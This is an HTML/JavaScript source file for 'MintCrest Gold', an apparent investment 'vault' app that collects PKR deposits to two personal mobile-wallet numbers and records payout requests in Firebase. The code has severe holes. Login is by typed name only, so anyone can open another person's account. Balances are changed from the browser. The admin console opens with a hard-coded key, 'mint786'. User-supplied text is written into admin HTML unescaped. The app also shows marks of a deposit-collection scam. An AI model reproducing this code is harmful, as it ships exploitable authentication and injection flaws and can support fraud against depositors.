<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Ultimate Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .spin-wheel { width: 180px; height: 180px; border-radius: 50%; border: 5px solid #1e3a8a; position: relative; transition: 4s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#1e40af 0deg 60deg, #3b82f6 60deg 120deg, #1e3a8a 120deg 180deg, #2563eb 180deg 240deg, #1d4ed8 240deg 300deg, #60a5fa 300deg 360deg); margin: 0 auto; }
        .wheel-pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-top: 20px solid #ef4444; z-index: 10; }
        select { -webkit-appearance: none; background: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>") no-repeat right 1rem center; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl mt-12">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase mt-4 border border-white/5 inline-block">No Active Fleet</div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-blue-600">
                <h3 class="text-center font-black uppercase text-sm mb-6">Deposit Capital</h3>
                <div class="space-y-2 mb-6 text-[10px] font-bold">
                    <div class="glass p-4 rounded-xl flex justify-between"><span>EasyPaisa</span><span class="text-green-400">03379827882</span></div>
                    <div class="glass p-4 rounded-xl flex justify-between"><span>JazzCash</span><span class="text-blue-400">03705519562</span></div>
                </div>
                
                <select id="dep-method" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10 outline-none">
                    <option value="" disabled selected>Select Deposit Method</option>
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Bank Transfer">Bank Transfer</option>
                </select>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase border border-white/10 outline-none">
                
                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-6 border border-dashed border-white/20 text-center cursor-pointer">
                    <span id="dep-file-label" class="text-[9px] font-bold opacity-50 uppercase">📸 Upload Receipt Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('dep-file-label').innerText = 'Proof Attached ✅'">
                </label>
                
                <button id="dep-btn" onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase">Submit Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-red-600">
                <h3 class="text-center font-black uppercase text-sm mb-6">Request Payout</h3>
                
                <select id="wd-method" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10 outline-none">
                    <option value="" disabled selected>Select Payout Method</option>
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Bank Transfer">Bank Transfer</option>
                </select>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="wd-acc" placeholder="Account Number & Title" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center text-[10px] font-bold border border-white/10 outline-none">
                
                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-6 border border-dashed border-white/20 text-center cursor-pointer">
                    <span id="wd-file-label" class="text-[9px] font-bold opacity-50 uppercase">📸 Upload Account Screenshot</span>
                    <input type="file" id="wd-proof" accept="image/*" class="hidden" onchange="document.getElementById('wd-file-label').innerText = 'Account Proof Attached ✅'">
                </label>

                <button id="wd-btn" onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        
        <h3 class="text-[10px] font-black uppercase text-gray-500 mb-4">Pending Financial Orders</h3>
        <div id="adm-sec-requests" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="active-tab text-xl">🏠</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="text-xl">📥</button>
        <button onclick="changePage('withdraw')" id="n-withdraw" class="text-xl">📤</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0 });
            localStorage.setItem('mc_user', name);
            startSync(name);
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); } });
        }

        async function submitDeposit() {
            const m = document.getElementById('dep-method').value; const a = document.getElementById('dep-amount').value;
            const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof').files[0];
            if(!m || !a || !t || !f) return alert("All fields & Proof required!");
            
            const btn = document.getElementById('dep-btn'); btn.innerText = "UPLOADING..."; btn.disabled = true;
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), type: "deposit", method: m, tid: t, proof: r.result, status: "pending", time: Date.now() });
                alert("Deposit Logged! Admin will verify proof sweetie. 😘");
                location.reload();
            };
        }

        async function submitWithdraw() {
            const m = document.getElementById('wd-method').value; const a = document.getElementById('wd-amt').value;
            const acc = document.getElementById('wd-acc').value; const f = document.getElementById('wd-proof').files[0];
            if(!m || !a || !acc || !f) return alert("Fill all details & Proof!");
            if(parseInt(a) > user.balance) return alert("Insufficient Balance!");

            const btn = document.getElementById('wd-btn'); btn.innerText = "AUTHORIZING..."; btn.disabled = true;
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), type: "withdraw", method: m, acc: acc, proof: r.result, status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
                alert("Withdrawal Requested! Processed in 24h. ❤️");
                location.reload();
            };
        }

        // Admin Console
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        
        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data();
                    list.innerHTML += `<div class="glass p-5 rounded-2xl text-[9px] font-black uppercase mb-4 border-l-4 ${d.type==='deposit'?'border-blue-500':'border-red-500'}">
                        <p class="text-blue-400 mb-2">USER: ${d.user}</p>
                        <p>TYPE: ${d.type} | METHOD: ${d.method}</p>
                        <p class="text-lg">AMOUNT: Rs ${d.amount}</p>
                        <p class="mt-2 text-gray-500">${d.type==='deposit' ? 'TID: '+d.tid : 'ACCOUNT: '+d.acc}</p>
                        <div class="flex gap-2 mt-4">
                            <button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-gray-700 px-4 py-2 rounded-lg">VIEW PROOF</button>
                            <button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'approved')" class="bg-green-600 px-4 py-2 rounded-lg">APPROVE</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function handleReq(id, u, amt, act) {
            if(act==='approved') {
                const ref = db.collection("users").doc(u); const doc = await ref.get();
                // Withdrawal balance pehle hi cut ho chuka hota hai, deposit add karna hota hai
                const type = (await db.collection("requests").doc(id).get()).data().type;
                if(type === 'deposit') await ref.update({ balance: (doc.data().balance||0) + amt });
            }
            await db.collection("requests").doc(id).update({ status: act });
            alert("Order Updated!");
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
        window.onload = () => { if(localStorage.getItem('mc_user')) { document.getElementById('user-name').value = localStorage.getItem('mc_user'); login(); } };
    </script>
</body>
</html>
